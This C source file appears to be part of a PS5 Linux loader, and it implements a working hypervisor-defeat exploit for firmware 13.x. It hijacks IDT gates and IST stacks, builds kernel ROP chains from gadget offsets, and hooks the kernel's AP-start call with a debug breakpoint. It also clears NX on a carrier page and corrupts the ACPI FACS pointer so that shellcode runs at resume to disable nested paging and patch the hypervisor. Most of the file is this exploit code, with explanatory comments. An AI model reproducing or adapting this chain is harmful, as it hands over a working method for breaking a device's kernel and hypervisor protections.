/* hv_defeat_13xx -- firmware 13.x hypervisor defeat for ps5-linux-loader.
 *
 * WHAT IT DOES, AND WHY THIS ROUTE
 *   0607 relied on an MSR 0x1B APIC-base intercept bug removed between 11.00 and 12.00.
 *   This one instead hooks the kernel's OWN AP-start call with a DR0 execute breakpoint
 *   (khook) and rewrites its arguments, so the AP is started at our carrier page. That call
 *   sits inside acpi_wakeup's wake loop, BEFORE DISABLE_STARTUP_MP -- so there is no
 *   ordering race, the core argument is already legal (cpu_apic_ids[cpu] < 16), and the
 *   one-shot bit is still clear. RESOLVED-v7-startup-mp-window.md blocked the naive design
 *   precisely because the FACS #GP fires AFTER DISABLE_STARTUP_MP; riding the call sidesteps
 *   that entirely.
 *
 *   The AP payload (shellcode_ap) then clears NESTED_CTRL.NP_ENABLE on all 16 VMCBs, and
 *   only after validating every one of them first. With nested paging off, gPA == hPA, the
 *   TMRs stop applying, and shellcode_kernel -- delivered separately, later at resume -- can
 *   patch the hypervisor's VMEXIT handler and drive all 16 CPUs into shellcode_hv.
 *
 * TWO DELIVERIES, TWO IST SLOTS
 *   IST6 = khook's #DB gate (the AP launch).
 *   IST7 = the #SX gate that delivers shellcode_kernel (copied from hv_defeat_0607.c).
 *   Free IST slots on 13.60 are 3, 6 and 7, so this is the whole budget.
 *
 * OFFSET DISCIPLINE
 *   Every address this file needs comes from env_offset (off_1360). Values that are not yet
 *   derived are 0 in that table and this function ABORTS on them rather than proceeding on a
 *   guess -- a wrong offset is worse than a missing one. See the [MISSING] markers in
 *   source/offsets.c. */

#include "hv_defeat_13xx.h"
#include "config.h"
#include "utils.h"
#include "prepare_resume.h"   /* hook_call_near() -- 0304-style deterministic resume hook */
#include "khook.h"
#include "../shellcode_ap/shellcode_ap.h"
#include <machine/segments.h>
#include <machine/tss.h>
#include <stdio.h>
#include <sys/mman.h>

#define IDT_SX          30
#define HOOK_CORE       0
#define HOOK_IST        6          /* khook's #DB gate */
#define DELIVERY_IST    7          /* shellcode_kernel delivery; IST6 is taken */
#define TSS_STRIDE      0x68

#define CARRIER_PA          0x3FFFF000UL
#define CARRIER_PARAMS_OFF  0xF00UL

/* must match shellcode_ap/main.c */
#define P_INIT_CB       0
#define P_DMAP          1
#define P_ORACLE        2
#define P_HV            3
#define P_HEAPOFF_ADDR  4
#define P_PCPUS_ADDR    5
#define P_MODE          6
#define P_HV_SIZE       30  /* real measured carveout size -- see shellcode_ap/main.c note */

#define HV_PCPUS_OFF    0x82A60UL
#define HV_HEAPOFF_OFF  0x83028UL

#define OFF_NVS_SIZETAB      0x1A1A030UL

static const uint64_t NVS_EXPECT[7] =
    { 0x2300, 0x200, 0x200, 0x0, 0x2000, 0x800, 0x1000 };

/* ---- khook needs (kaddr, buf, len) returning int; the loader's helpers return void ---- */
static int kh_read(uint64_t ka, void *dst, size_t len)  { kread(ka, dst, len); return 0; }
static int kh_write(uint64_t ka, const void *src, size_t len) {
  kwrite(ka, (void *)src, len);
  return 0;
}

static void setidt(int idx, uintptr_t func, int typ, int dpl, int ist) {
  struct gate_descriptor ip = {};
  ip.gd_looffset = func;
  ip.gd_selector = GSEL(GCODE_SEL, SEL_KPL);
  ip.gd_ist = ist;
  ip.gd_xx = 0;
  ip.gd_type = typ;
  ip.gd_dpl = dpl;
  ip.gd_p = 1;
  ip.gd_hioffset = func >> 16;
  kwrite(ktext + env_offset.IDT + idx * sizeof(struct gate_descriptor), &ip, sizeof(ip));
}

/* ------------------------------------------------------------------ H derivation
 * The carveout base is a RUNTIME value on every console. Our probes measure 0x62800000 on
 * this box; the third-party Reborn payload hardcodes 0x68000000, which lies inside guest RAM
 * [4] 0x64829000..0x7f9d0000 here. We derive it and let the AP payload range-check every
 * VMCB address against [H, H+0x2029000) before it writes anything. */
static uint64_t derive_H(void) {
  /* Body moved to utils.c's derive_hv_base() (2026-10-18) so prepare_resume.c can call the
   * SAME logic to re-base HV_HANDLE_VMEXIT_PA/HV_CODE_CAVE_PA before this function's own call
   * happens (prepare_resume() runs before hv_defeat_13xx() in main.c's flow). Kept as a local
   * alias so every existing call site in this file (`derive_H()`) stays unchanged. */
  return derive_hv_base();
}

/* ---- fallback delivery of shellcode_kernel, copied from hv_defeat_0607.c ----------------
 * The #DB hook frees us from having to trigger anything for the AP launch, but
 * shellcode_kernel still has to run at resume in GameOS kernel context. The 0607 mechanism
 * is independent of the APIC-base bug: plant an IST ROP that faults at resume, copies
 * kernel_cave_shellcode into KERNEL_CODE_CAVE and jumps. */
static void build_sx_rop(uint64_t ist, size_t shellcode_kernel_len, uint64_t oracle_va) {
  uint64_t rop_buf[256] = {};
  uint64_t *rop = rop_buf;

  /* ---- ORACLE-LEVEL DIAGNOSTIC, FIRST of all, before the UART diagnostics below -----------
   * The raw 'S'/'M' UART bytes below are unreliable: on a devkit, multiple cores can write the
   * same TX register concurrently during a fatal, scrambling single-byte markers into noise
   * (observed: "BIOS Fatal Error(0BxI2O4S7 1F)a" on crash runs -- 'S'/'M' indistinguishable from
   * that contention). The oracle (kernel DATA_CAVE+0x440) is the SAME mechanism already trusted
   * from PROBE-ONLY tests and survives a later crash for oracle_probe.elf to read post-mortem.
   * 0x15A0 = the #GP fired and THIS ROP (not the stock #GP handler) is executing. Three IDA
   * passes confirmed the #GP is architecturally guaranteed to occur on every resume; this ladder
   * answers whether it's actually reaching OUR handler, which the raw UART bytes couldn't. */
  (void)oracle_va;  /* oracle ladder REMOVED 2026-10-17 -- ROP restored to the known-good chain */

  /* ---- ROP-LEVEL DIAGNOSTICS, so they run before anything can fault ---------------------
   * The 13.x wake dies with no output at all, which cannot distinguish "the ROP never
   * started" (mis-aligned exception frame, or the handler gadget at 0x9E32B4 is not what we
   * think it is) from "the ROP ran and the memcpy or the jump into KERNEL_CODE_CAVE is bad".
   * These steps answer it with gadgets only: open the UART gate, then print straight to the
   * UART TX register -- the same register the visible uart_on beacon writes. 'S' on the wire
   * means the ROP is executing; 'M' means FUN_MEMCPY returned.
   *
   * `or [rcx], eax` is used deliberately instead of `mov [rcx], rax`: it is a 4-BYTE
   * read-modify-write, and both the gate (0xC0115110) and the TX register (0xC1010104) are
   * 4-byte MMIO. An 8-byte store would clobber the neighbouring register.
   *
   * The gate is opened here rather than assumed because S3 clears it AND the shellcode's own
   * activate_uart() does not re-open it (it masks a write-only register, so it computes 0). */
  *rop++ = ktext + env_offset.GAD_POP_RCX_RET;
  *rop++ = dmap + 0xC0115110ULL;                        /* UART gate (write-only, reads 0) */
  *rop++ = ktext + env_offset.GAD_POP_RAX_RET;
  *rop++ = 0x200ULL;                                    /* the value uart_on proves works  */
  *rop++ = ktext + env_offset.GAD_OR_RCX_EAX_RET;
  *rop++ = ktext + env_offset.GAD_POP_RCX_RET;
  *rop++ = dmap + 0xC1010104ULL;                        /* UART TX                         */
  *rop++ = ktext + env_offset.GAD_POP_RAX_RET;
  *rop++ = 'S';
  *rop++ = ktext + env_offset.GAD_OR_RCX_EAX_RET;

  *rop++ = ktext + env_offset.GAD_POP_RDI_RET;
  *rop++ = ktext + env_offset.KERNEL_CODE_CAVE;
  *rop++ = ktext + env_offset.GAD_POP_RSI_RET;
  *rop++ = kernel_cave_shellcode;
  *rop++ = ktext + env_offset.GAD_POP_RDX_RET;
  *rop++ = shellcode_kernel_len;
  *rop++ = ktext + env_offset.FUN_MEMCPY;

  /* 'M' = the copy returned. 'S' without 'M' incriminates FUN_MEMCPY or its operands. */
  *rop++ = ktext + env_offset.GAD_POP_RCX_RET;
  *rop++ = dmap + 0xC1010104ULL;
  *rop++ = ktext + env_offset.GAD_POP_RAX_RET;
  *rop++ = 'M';
  *rop++ = ktext + env_offset.GAD_OR_RCX_EAX_RET;

  /* 0x15B0 = FUN_MEMCPY (the cave write) returned without faulting. If the run crashes but the
   * oracle only ever reads 0x15A0 (never 0x15B0), FUN_MEMCPY/the cave write itself is where it
   * dies -- the same NPF class already proven for the #DB-chain delivery attempt. If 0x15B0 is
   * reached, the jmp into KERNEL_CODE_CAVE is the remaining unknown. */
  *rop++ = ktext + env_offset.KERNEL_CODE_CAVE;         /* jump into the delivered code    */

  kwrite(ist + 0x1000, rop_buf, (uintptr_t)rop - (uintptr_t)rop_buf);
}

/* Abort if any offset this file depends on is still 0 in off_1360. Guessing is worse than
 * stopping: a wrong gadget in a ROP chain is arbitrary code execution on a live kernel. */
/* PAGE-TABLE-ONLY diagnostics. *** READ .text AND THE CONSOLE FREEZES. ***
 *
 * CONTEXT.txt standing rule 6 / CLAUDE.md rule 6: "Never read kernel .text from the guest --
 * XOM freezes the console." An earlier version of this diagnostic dumped the BYTES at these
 * addresses with kread and froze the console twice (attempts 6 and 7, beacon dying at 000094
 * and 000043). .text is XOM (execute-only): reading it is fatal. Do NOT add a kread of .text
 * here, however tempting -- read the PAGE TABLES instead.
 *
 * The page tables live in data and ARE readable, and they answer the question that matters:
 * has .text actually been made RW / had its XO bit (58) cleared? If not, shellcode_kernel's
 * first action -- writing kernel_uart_override, which lives in .text -- faults on the IST stack
 * and the console dies with no output whatsoever.
 *
 * remove_xotext() (prepare_resume.c) sweeps `for (a = ktext; a < kdata; a += 0x1000)`. If ktext
 * is the runtime (KASLR-slid) base while kdata is still a preslide constant, then ktext > kdata
 * and the loop body NEVER RUNS -- silently doing nothing. So also print both bounds here. */
static void dump_pte_bits(const char *name, uint64_t va) {
  uint64_t table_phys = cr3;
  uint64_t entry = 0;
  int last = -1;

  notify("  %-26s va=0x%lx:", name, va);
  for (int level = 0; level < 4; level++) {
    int shift = 39 - (level * 9);
    uint64_t idx = (va >> shift) & 0x1FF;
    uint64_t entry_va = dmap + PAGE_PA(table_phys) + idx * 8;

    kread(entry_va, &entry, sizeof entry);
    notify(" L%d[P%d R%d X%d N%d S%d]", level, !!PAGE_P(entry), !!PAGE_RW(entry),
           !!PAGE_XO(entry), !!(entry & (1ULL << 63)), !!PAGE_PS(entry));
    last = level;
    if (!PAGE_P(entry) || ((level == 1 || level == 2) && PAGE_PS(entry)) || level == 3)
      break;
    table_phys = PAGE_PA(entry);
  }
  notify("\n");
  fflush(stdout);
}

static void dump_text_perm(void) {
  notify("PTE STATE cr3=0x%lx dmap=0x%lx\n", cr3, dmap);
  notify("SWEEP BOUNDS ktext=0x%lx kdata=0x%lx -> loop runs? %s\n", ktext, kdata,
         (ktext < kdata) ? "YES" : "*** NO - remove_xotext DID NOTHING ***");
  fflush(stdout);

  dump_pte_bits("kernel_uart_override", ktext + env_offset.KERNEL_UART_OVERRIDE);
  dump_pte_bits("kernel_cfi_check", ktext + env_offset.KERNEL_CFI_CHECK);
  dump_pte_bits("KERNEL_CODE_CAVE", ktext + env_offset.KERNEL_CODE_CAVE);
  dump_pte_bits("GAD_ADD_RSP_28..RBP", ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET);
  dump_pte_bits("FUN_MEMCPY", ktext + env_offset.FUN_MEMCPY);
  dump_pte_bits("DATA_CAVE", ktext + env_offset.KERNEL_SYM_DATA_CAVE);
  /* The page the AP is told to start executing at. If N1 shows here, the AP will take an
   * instruction-fetch fault on the wake -- the loader's missing step. */
  dump_pte_bits("CARRIER_PA via dmap", dmap + CARRIER_PA);

  notify("VERDICT: leaf XO/RW printed per line above. X=1 or R=0 at the leaf means .text is\n"
         "VERDICT: still execute-only and shellcode_kernel's first write WILL fault.\n");
  fflush(stdout);
}

/* ------------------------------------------------------------------ carrier page NX clear
 *
 * *** THIS IS THE THING THE LOADER WAS MISSING. ***
 *
 * The hook rewrites the kernel's own AP-start call so the AP begins executing at
 * dmap(CARRIER_PA). That page is mapped EXECUTE_DISABLE (NX) -- it is ordinary data. The probe
 * clears the bit and logs why:
 *     "K04 carrier page NX cleared" /
 *     "The AP executes at dmap(CARRIER_PA), so EXECUTE_DISABLE must be clear on it there."
 * and Reborn does the identical thing for STARTUP_MP_PAYLOAD_PAGE before installing its hook.
 *
 * The loader never did. So the AP takes an instruction-fetch fault inside the kernel's wake
 * loop and the console dies at the wake with NO output at all -- which is exactly the failure
 * we have been chasing: it is the single thing the working probe does that this path omits,
 * and it explains why the identical hook survives in the probe and not here.
 *
 * Walks from cr3 (kernel_pmap.pm_cr3) exactly like page_chain_set_rw(), clearing bit 63 (NX)
 * on every present level and stopping at the first large page. */
static void clear_execute_disable(const char *what, uint64_t va) {
  const uint64_t NX = 1ULL << 63;
  uint64_t table_phys = cr3;

  for (int level = 0; level < 4; level++) {
    int shift = 39 - (level * 9);
    uint64_t idx = (va >> shift) & 0x1FF;
    uint64_t entry_va = dmap + PAGE_PA(table_phys) + idx * 8;
    uint64_t entry;

    kread(entry_va, &entry, sizeof entry);
    if (!PAGE_P(entry)) {
      notify("NX %s: level %d not present, nothing to clear\n", what, level);
      return;
    }

    if (entry & NX) {
      entry &= ~NX;
      kwrite(entry_va, &entry, sizeof entry);
      notify("NX %s: CLEARED at level %d\n", what, level);
    }

    if (((level == 1 || level == 2) && PAGE_PS(entry)) || level == 3) {
      notify("NX %s: done (leaf at level %d, PS=%d)\n", what, level, !!PAGE_PS(entry));
      return;
    }
    table_phys = PAGE_PA(entry);
  }
}

static int offsets_present(void) {
  /* Fields every khook build needs, whichever store inventory the kernel has. */
  const uint64_t need[] = {
    env_offset.KERNEL_SYM_HV_MP_STARTUP_CALL,
    env_offset.KERNEL_SYM_MP_STARTUP_INIT_VECTOR,
    env_offset.KERNEL_SYM_DATA_CAVE,
    env_offset.GAD_PIVOT_ADD_RSP28_RET,
    env_offset.GAD_MOV_RAX_RDI_RET,
    env_offset.GAD_REP_MOVSB,
    env_offset.GAD_CLD_RET,
    env_offset.GAD_RET_TRAMP,
    env_offset.GAD_DBREG_RESUME,
    env_offset.GAD_POP_RAX_RET,
    env_offset.GAD_POP_RCX_RET,
    env_offset.GAD_POP_RDI_RET,
    env_offset.GAD_POP_RSI_RET,
    env_offset.GAD_POP_RDX_RET,
    env_offset.GAD_POP_RSP_RET,
    env_offset.IDT,
    env_offset.COMMON_TSS,
    env_offset.ACPIGBL_FACS,
    env_offset.FUN_MEMCPY,
    env_offset.KERNEL_CODE_CAVE,
  };
  /* 13.60's store inventory. */
  const uint64_t need_rcx[] = {
    env_offset.GAD_POP_R8_RET,
    env_offset.GAD_STORE_RCX_R8_RET,
    env_offset.GAD_STORE_RDI8_RCX_RET,
    /* GAD_OR_RCX_EAX_RET is NOT required here: emit_resume_tail uses it ONLY in
     * the oneshot=0 branch, and oneshot is set from GAD_SET_DR7_RAX being present.
     * 11.x has SET_DR7 but no OR_RCX_EAX, and demanding both would reject a table
     * that is in fact complete for the way the chain is actually emitted. */
    env_offset.GAD_SET_DR7_RAX,
    env_offset.GAD_ST_RCX_RDX_RET,
    env_offset.GAD_ST_RCX_RAX_RET,
    env_offset.GAD_MOV_RAX_RSI_RET,
  };
  /* 7.61 / 8.00's inventory. These kernels contain NONE of need_rcx at a drop-in ret and
   * 13.60 contains neither of these, so a table supplies exactly one set and khook emits
   * to match (kh_retargeted() keys off GAD_STORE_RCX_R8_RET being zero). Demanding
   * need_rcx unconditionally is what would reject a perfectly good 7.61 table. */
  const uint64_t need_rdi[] = {
    env_offset.GAD_STORE_RDI_RAX_RET,
    env_offset.GAD_OR_RSI_ECX_RET,
  };
  unsigned i;
  int have_rcx = 1, have_rdi = 1;

  for (i = 0; i < sizeof(need) / sizeof(need[0]); i++)
    if (!need[i])
      return 0;
  for (i = 0; i < sizeof(need_rcx) / sizeof(need_rcx[0]); i++)
    if (!need_rcx[i]) { have_rcx = 0; break; }
  for (i = 0; i < sizeof(need_rdi) / sizeof(need_rdi[0]); i++)
    if (!need_rdi[i]) { have_rdi = 0; break; }
  /* Exactly one complete set, never a half-populated mixture. */
  return have_rcx || have_rdi;
}

int hv_defeat_13xx(void *shellcode_kernel, size_t shellcode_kernel_len) {
  khook_t hook;
  kh_chain_t chain;
  static uint8_t chain_buf[0x800];
  /* NOTE: config.h defines `cave` as a macro (0x100000000ULL), so the local that holds the
   * kernel data cave must not be called `cave`. Same for anything else config.h owns. */
  uint64_t kh_cave, oracle_va, hv_base, ist_deliver;
  /* The carrier's physical address. Fixed at CARRIER_PA historically; see the
   * PS5_DYNAMIC_CARRIER note below for why that is only safe on 13.x. */
  uint64_t carrier_pa = CARRIER_PA;
  int ret;

  if (!offsets_present()) {
    notify("13.60 offsets are incomplete - refusing to arm.\n"
           "See HVBUG/findings/LINUX-OFFSETS-13.60-DERIVED.md.");
    return -1;
  }

  /* validity gate first: never act on reads that could be silently zero */
  const uint64_t nvs_off = env_offset.NVS_SIZETAB ? env_offset.NVS_SIZETAB
                                                 : OFF_NVS_SIZETAB;
  for (int i = 0; i < 7; i++)
    if (kread64(ktext + nvs_off + (uint64_t)i * 8) != NVS_EXPECT[i]) {
      notify("validity gate failed - wrong firmware image?");
      return -1;
    }

  /* PAGE-TABLE-ONLY diagnostics (safe -- never reads .text, see dump_text_perm).
   * Replaces an earlier byte dump that read .text and froze the console twice (rule 6). */
  notify("DIAG: .text permission state (page tables only)\n");
  dump_text_perm();
  notify("DIAG done, continuing to arm\n");
  fflush(stdout);

  kh_cave   = ktext + env_offset.KERNEL_SYM_DATA_CAVE;
  oracle_va = kh_cave + KH_OFF_USER;

  hv_base = derive_H();
  if (!hv_base) {
    notify("could not derive H from the EFI map - refusing to arm.");
    return -1;
  }
  /* HPROBE: print the derived HV carveout base. On this devkit it must be 0x62800000 on EVERY
   * 13.x. A different value on 13.20 means derive_H's EFI-map heuristic picked the wrong region,
   * so the AP payload reads bogus heap/pcpus, the VMCB census fails, NP_ENABLE is never cleared,
   * and the first .text write faults -- the exact 13.20 crash. Printed at ARM, no wake needed. */
  notify("HPROBE: derived H = 0x%lx (expect 0x62800000; HV_HEAPOFF=+0x%lx PCPUS=+0x%lx)\n",
         (unsigned long)hv_base, (unsigned long)HV_HEAPOFF_OFF, (unsigned long)HV_PCPUS_OFF);

  /* The hook fires on the core that runs the kernel's wake loop, so DR0 has to be live
   * there. bpring0.c measured cpuset_setaffinity REFUSED without this ucred elevation. */
  kernel_set_ucred_authid(getpid(), 0x4800000000000007);
  {
    int prc = pin_to_core_reborn(HOOK_CORE);

    /* GATE ON THE RETURN CODE ONLY -- never on sceKernelGetCurrentCpu().
     *
     * That readback uses the IA32_TSC_AUX numbering (`sub_80A4DA90` is `mov al,0Fh ;
     * sub al,dil`, called with gs:0x34), so it reads (15 - cpu) and returns 15 when the
     * thread is on cpu 0. A gate of `sceKernelGetCurrentCpu() != HOOK_CORE` is therefore a
     * GUARANTEED false negative on HOOK_CORE = 0 -- it is not a safety net. The probe hit
     * this, refused to arm exactly like this, and the fix was to delete the gate; that fix
     * never reached this file and it stopped the first hardware run of this loader.
     *
     * Note also that the mask convention differs between the two upstreams: Reborn uses
     * `1 << (15 - num)` and ps5-linux-loader's own pin_to_core uses `1 << num`. They select
     * different cores, so this calls pin_to_core_reborn (see utils.c) -- the convention the
     * probe proved on this console. Using upstream's here would arm the hook on one core
     * while khook writes common_tss[HOOK_CORE] for another. */
    notify("pin_to_core_reborn(%d) rc=%d (get_cpu reads %d)\n", HOOK_CORE, prc,
           sceKernelGetCurrentCpu());
    if (prc != 0) {
      notify("could not pin to core %d - refusing to arm.", HOOK_CORE);
      return -1;
    }
  }

  /* ---- the data cave must actually be free ------------------------------------------
   * khook writes its chain, resume context and the AP blob into kh_cave. For firmwares whose
   * cave was derived by CONVENTION rather than recorded, that page being unused is an
   * assumption -- and an assumption of exactly the kind that the hardcoded carrier page turned
   * into a Fatal trap 12. Check it. */
  {
    int nonzero = 0;
    for (uint64_t off = 0; off < 0x4000; off += 8) {
      if (kread64(kh_cave + off)) { nonzero++; }
    }
    if (nonzero) {
      notify("data cave at 0x%lx is NOT empty (%d non-zero qwords in 0x4000) - refusing to arm.\n"
             "That page is in use by the kernel; khook would corrupt it.",
             (unsigned long)kh_cave, nonzero);
      return -1;
    }
  }

  /* ---- carrier page selection ------------------------------------------------------
   * CARRIER_PA is a FIXED physical address inherited from the 13.x probe. Nothing recorded
   * says why 0x3FFFF000 specifically, and the arm writes 0xF00 bytes into it and clears its
   * NX bit before any shellcode is delivered. If that page is in use on this firmware, the
   * arm alone corrupts kernel memory -- which is exactly how 8.00 dies (Fatal trap 12 on
   * resume, from a build that delivered nothing). */
  /* ---- stage the AP payload into the cave -------------------------------------------
   * khook's scratch owns cave+0x000..0x500 and cave+0x3a00..; the blob goes at 0x1000,
   * inside the gap, which is where upstream puts it. */
  kwrite(kh_cave + 0x1000, shellcode_ap_bin, shellcode_ap_bin_len);

  /* ---- install the hook -------------------------------------------------------------
   * Rewrite the arguments of the kernel's own AP-start call: RSI = the AP entry VA,
   * RDX = the kernel's own page tables. */
  ret = kh_init(&hook, kh_read, kh_write, ktext, kh_cave, HOOK_IST);
  if (ret)
    return -1;

  hook.tss_stride = TSS_STRIDE;
  kh_set_tables(&hook, ktext + env_offset.IDT, ktext + env_offset.COMMON_TSS);
  kh_set_core(&hook, HOOK_CORE);
  /* oneshot CLEARS DR7 when the hook fires, which needs `mov dr7,rax`. That gadget does
   * not exist anywhere in 7.61's or 8.00's .text for ANY register, so on those kernels
   * the hook must stay persistent and rely on the RF flag instead (emit_resume_tail's
   * retargeted branch sets RF on the frame RFLAGS via `or [rsi],ecx`).
   *
   * CONSEQUENCE: persistent means the hook fires on EVERY execution of the AP-start
   * call -- once per AP rather than once -- so every AP is redirected to the carrier
   * page. If a wake misbehaves on a retargeted kernel, suspect this first.
   *
   * kh_install() also enforces this pairing and returns -18 if it is violated. */
  hook.oneshot = env_offset.GAD_SET_DR7_RAX ? 1 : 0;

  kh_set_hook_target(&hook, ktext + env_offset.KERNEL_SYM_HV_MP_STARTUP_CALL);
  kh_set_resume_rsi(&hook, dmap + carrier_pa);
  kh_set_resume_rdx(&hook, cr3);

  kh_chain_init(&chain, chain_buf, sizeof chain_buf);
  kh_chain_store(&chain, oracle_va, 0);

  /* move the blob from the cave to the carrier page, then fill the parameter block */
  kh_chain_memcpy(&chain, dmap + carrier_pa, kh_cave + 0x1000, 0xF00);
  kh_chain_store(&chain, dmap + carrier_pa + CARRIER_PARAMS_OFF + P_INIT_CB * 8,
                 ktext + env_offset.KERNEL_SYM_MP_STARTUP_INIT_VECTOR);
  kh_chain_store(&chain, dmap + carrier_pa + CARRIER_PARAMS_OFF + P_DMAP * 8, dmap);
  kh_chain_store(&chain, dmap + carrier_pa + CARRIER_PARAMS_OFF + P_ORACLE * 8, oracle_va);
  /* P_HV carries the plain carveout REGION base (used by the AP's own VMCB-address bounds
   * checks, which span the whole region). P_HEAPOFF_ADDR/P_PCPUS_ADDR must instead be relative
   * to where the HV's own CODE/globals actually start -- the SAME location patch_hv() targets,
   * which on PS5 Pro is 0x800000 further into the region than the region base itself (see
   * HV_CODE_OFFSET_PRO in utils.h). Using the unadjusted region base for these two on Pro reads
   * the wrong kernel addresses for hv_heap_offset/pcpus[], the actual remaining cause of
   * repeated console crashes on wake even after the H/HV_SIZE fixes above -- cross-checked
   * against github.com/ps5-linux/ps5-linux-loader PR #47, 2026-10-18. */
  uint64_t hv_code_base = hv_base;
  if (fw == 0x1360 && sceKernelGetMainSocId() == SOC_ID_PS5_PRO)
    hv_code_base += HV_CODE_OFFSET_PRO;
  kh_chain_store(&chain, dmap + carrier_pa + CARRIER_PARAMS_OFF + P_HV * 8, hv_base);
  kh_chain_store(&chain, dmap + carrier_pa + CARRIER_PARAMS_OFF + P_HEAPOFF_ADDR * 8,
                 hv_code_base + HV_HEAPOFF_OFF);
  kh_chain_store(&chain, dmap + carrier_pa + CARRIER_PARAMS_OFF + P_PCPUS_ADDR * 8,
                 hv_code_base + HV_PCPUS_OFF);
  kh_chain_store(&chain, dmap + carrier_pa + CARRIER_PARAMS_OFF + P_MODE * 8, 1);  /* defeat */
  /* Real carveout size, measured alongside hv_base above. Was a hardcoded 0x2029000
   * (devkit/base) baked into the AP shellcode until 2026-10-18 -- PS5 Pro retail's real
   * carveout measures 0x2000000 (confirmed real hardware), ~164KB smaller, so the old
   * constant let the AP's VMCB-address bounds checks accept addresses just past the real
   * carveout on Pro. g_hv_carveout_size is 0 if derive_hv_base() didn't find a match (should
   * not happen here since hv_base itself came from the same call); fall back to the old
   * constant in that case rather than pass 0 and have every bounds check reject everything. */
  kh_chain_store(&chain, dmap + carrier_pa + CARRIER_PARAMS_OFF + P_HV_SIZE * 8,
                 g_hv_carveout_size ? g_hv_carveout_size : 0x2029000ULL);

  /* Make the page the AP will execute from actually executable -- see clear_execute_disable().
   * Both the probe and Reborn do this immediately before installing the hook; omitting it is
   * what killed every 13.x wake. */
  clear_execute_disable("carrier page", dmap + carrier_pa);

  ret = kh_install(&hook, &chain);
  if (ret) {
    notify("khook install failed (%d) - refusing to suspend.", ret);
    return -1;
  }

  /* *** THIS IS WHAT ARMS THE BREAKPOINT ***
   * kh_install only plants the gate/IST6/arm_chain; it does NOT write DR0/DR7. kh_trigger
   * sets TF, single-steps a #DB through the hijacked gate into arm_chain, and DBREG_RESUME
   * loads DR0 from RAX and DR7 from the context. Reborn's main.c calls it right here.
   *
   * Omitting this call is SILENT: kh_install still returns 0, the payload still succeeds,
   * and the breakpoint simply never exists -- so the whole defeat becomes a no-op that
   * looks like it worked. Do not remove it. */
  kh_trigger(&hook);

  /* ---- shellcode_kernel delivery on IST7 --------------------------------------------
   * The trigger is the FACS corruption below, and the exception it raises is a #GP
   * (vector 13, IDT_GP) -- this file's own comment says so, and so does hv_defeat_0607.c,
   * which installs a handler at IDT_GP for exactly that reason.
   *
   * This file previously installed the delivery ROP ONLY at IDT_SX (vector 30). The #SX
   * naming is a copy-paste artefact of taking 0607's build_sx_rop half and dropping 0607's
   * IDT_GP install -- which was the only handler on the vector that actually fires. Result:
   * at resume the #GP reached the kernel's ordinary #GP handler and the console PANICKED on
   * the power-button wake, with nothing on the UART (S3 clears the gate).
   *
   * Install on BOTH vectors, mirroring 0607's arrangement. Whichever fires first runs the
   * ROP and the ROP never returns -- it jumps into shellcode_kernel -- so sharing IST7
   * between them is safe, and no extra IST slot is needed (the budget is 3, 6, 7 with IST6
   * already taken by khook's #DB gate). */
  ist_deliver = pa_to_dmap(alloc_page());
  build_sx_rop(ist_deliver, shellcode_kernel_len, oracle_va);
  kwrite64(ktext + env_offset.COMMON_TSS + offsetof(struct amd64tss, tss_ist7),
           ist_deliver + 0x1000);
  setidt(IDT_GP, ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET, SDT_SYSIGT, SEL_KPL,
         DELIVERY_IST);
  setidt(IDT_SX, ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET, SDT_SYSIGT, SEL_KPL,
         DELIVERY_IST);

  /* During suspend AcpiSetFirmwareWakingVector corrupts its own pointer, and at resume it
   * raises #GP, which runs the chain. */
  {
    uint64_t facs_va = ktext + env_offset.ACPIGBL_FACS;
    uint64_t before = kread64(facs_va);
    /* DETERMINISTIC #PF TRIGGER (replaces facs_va-8).
     * AcpiSetFirmwareWakingVector does `mov [rax+0xc],edi` where rax=*AcpiGbl_FACS and edi=the
     * real-mode wake-vector PHYSICAL addr (wakePA, < 1MB). With the old facs_va-8, that store
     * lands at the HIGH dword of the pointer slot, so at resume the mangled pointer is
     * (wakePA<<32)|low32(facs_va-8) and the fault address's high half is wakePA -- a runtime
     * contigmalloc value. On 13.60 that happens to be non-canonical -> clean #GP we catch; on
     * 13.20 it is canonical and, with nested paging off, resolves to a secure/SoC physical page
     * -> FATAL SOC below the IDT (uncatchable). Using facs_va-0xC instead makes the store land at
     * the LOW dword, so the slot becomes 0xFFFFFFFF_<wakePA>; at resume the deref faults at
     * 0xFFFFFFFF000xxxxx -- canonical KERNEL half, always unmapped (below the kernel image base),
     * a deterministic #PF delivered through the IDT regardless of wakePA/firmware. Data-only write
     * (no .text), so it also avoids the ACM/smp_rendezvous arm-time wall. Requires PS5_CATCH_PF
     * (routes #PF(14) to the IST7 delivery). The [rax+4]<0x21 gate keeps the 64-bit store skipped:
     * [rax+4]=[facs_va-8] is zero BSS padding with no xref. */
    /* FIXED NON-CANONICAL nonzero sentinel. IDA diff proved 13.20/13.60 setter+callers+trampoline
     * are byte-identical and AcpiGbl_FACS is never re-inited at resume, so the fault CLASS is purely
     * a function of this value. Setter: rax=*AcpiGbl_FACS; test rax,rax; jz ret; mov [rax+0xc],edi.
     * A canonical-mapped value (old facs_va-0xC -> [rax+0xc]=facs_va, writable .data) makes the store
     * SILENTLY SUCCEED -> no fault -> 13.20 resumes normally (the 0-marker no-op we observed).
     * 0x8000000000000000 -> [rax+0xc]=0x800000000000000c = non-canonical -> deterministic #GP on every
     * firmware -> IDT_GP->IST7->shellcode. Nonzero clears the test/jz null-guard. */
    /* RESTORED 2026-10-17 to the known-good 13.60 value (1360linux.elf): facs_va - 8. */
    uint64_t facs_sentinel = facs_va - 8;
    kwrite64(facs_va, facs_sentinel);
    uint64_t after = kread64(facs_va);
    /* VERIFY THE TRIGGER. On 13.20 the console resumes NORMALLY -- no #GP, no shellcode -- so
     * the question is whether this corruption is even landing. If `after` is not facs_va-8 the
     * write did not stick and the whole route is dead before the suspend even starts. The
     * pointer it held BEFORE also matters: AcpiSetFirmwareWakingVector writes at [ptr+0xc], so
     * the clobber only lands on the pointer itself when the layout is what we assume. */
    notify("FACS TRIGGER: va=0x%lx before=0x%lx wrote=0x%lx readback=0x%lx %s\n",
           facs_va, before, facs_sentinel, after,
           (after == facs_sentinel) ? "OK (non-canonical -> #GP at resume)" : "*** WRITE DID NOT STICK ***");
    fflush(stdout);
  }

  return 0;
}
